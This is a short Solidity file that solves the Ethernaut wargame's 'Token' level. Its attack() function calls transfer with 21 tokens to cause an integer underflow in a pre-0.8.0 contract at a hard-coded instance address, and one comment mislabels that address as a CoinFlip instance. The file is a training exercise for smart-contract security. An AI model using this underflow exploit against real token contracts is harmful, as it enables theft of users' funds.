// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

/**
 * @title 5. TOKEN
 * @dev Get more tokens. Preferably a very large amount.
 */
interface IToken {
    function transfer(address _to, uint _value) external returns (bool);
}

// Solidity versions below 0.8.0 are vulnerable to underflow/overflow attacks.
contract Ethernaut_Token {
    address constant tokenInstance = 0x0A7fF7D1e4aEFB3549413F9508AB902C189cBff3; // Replace with your CoinFlip instance

    // This will transfer 21 tokens and trigger an underflow attack.
    function attack() public {
        IToken(tokenInstance).transfer(msg.sender, 21);
    }
}

// 🎉 Level completed! 🎉
